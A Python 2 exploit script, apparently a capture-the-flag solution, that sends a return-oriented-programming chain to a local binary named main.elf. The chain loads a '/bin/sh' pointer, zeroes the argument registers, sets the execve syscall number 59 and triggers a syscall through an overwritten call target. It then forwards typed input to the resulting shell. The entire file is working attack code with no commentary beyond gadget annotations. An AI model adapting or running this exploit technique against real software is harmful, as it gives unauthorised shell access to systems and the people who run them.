#!/usr/bin/env python
from __future__ import print_function

import struct
import subprocess
import time

cat = subprocess.Popen("cat", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
r = subprocess.Popen("./main.elf".split(), stdin=cat.stdout)

payload = ""
payload += struct.pack("<Q", 0x402d28) # ret: pop rdi ; ret
payload += struct.pack("<Q", 0x40404d) # rdi: /bin/sh
payload += struct.pack("<Q", 0x400879) # ret: pop rsi ; pop r15 ; ret
payload += struct.pack("<Q", 0) # rsi: 0
payload += struct.pack("<Q", 0xcafebabe) # r15
payload += struct.pack("<Q", 0x402d2a) # ret: nop ; pop rbp ; ret
payload += struct.pack("<Q", 0) # rbp: 0
payload += struct.pack("<Q", 0x403474) # ret: xchg eax, ebp ; ret / eax: 0, ebp: ?
payload += struct.pack("<Q", 0x40290f) # ret: xchg eax, edx ; ret / eax: ?, edx: 0
payload += struct.pack("<Q", 0x402d2a) # ret: nop ; pop rbp ; ret
payload += struct.pack("<Q", 59) # rbp: 59
payload += struct.pack("<Q", 0x403474) # ret: xchg eax, ebp ; ret / eax: 59, ebp: ?
payload += struct.pack("<Q", 0x403ac2) # ret: syscall
payload += "\xaa" * (0x70 - len(payload))
payload += struct.pack("<Q", 0x402d28) # [start] call rax -> pop rdi ; ret

payload_str = payload.encode("hex")
payload_str = "\\x" + "\\x".join(payload_str[i:i+2] for i in range(0, len(payload_str), 2))
print("PAYLOAD: %s" % payload_str)

cat.stdin.write(payload)

while True:
  text = raw_input("> ") 
  cat.stdin.write(text + "\n")

